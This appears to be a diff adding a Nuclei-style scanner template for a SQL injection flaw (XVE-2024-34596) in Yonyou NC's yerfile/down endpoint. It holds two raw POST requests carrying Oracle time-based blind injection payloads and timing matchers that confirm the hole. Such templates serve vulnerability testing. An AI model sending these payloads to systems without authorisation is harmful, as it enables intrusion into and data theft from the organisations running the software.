@@ -1,0 +1,37 @@
+id: yongyouNC-yerfile_down-sql-XVE-2024-34596
+
+info:
+  name: 用友NC yerfile/down SQL注入(XVE-2024-34596)
+  author: HuanXiong
+  severity: high
+  description: |-
+    
+  reference:
+    - 
+  tags: SQL Injection
+
+
+http:
+  - raw:
+      - |
+        POST /portal/pt/yerfile/down/bill?pageId=login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        id=1'+AND+4563=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),4)--
+
+      - |
+        POST /portal/pt/yerfile/down/bill?pageId=login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        id=1'+AND+4563=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),8)--
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=4 && duration_1<=5'  
+          - 'duration_2>=8 && duration_2<=9'
+        condition: and  
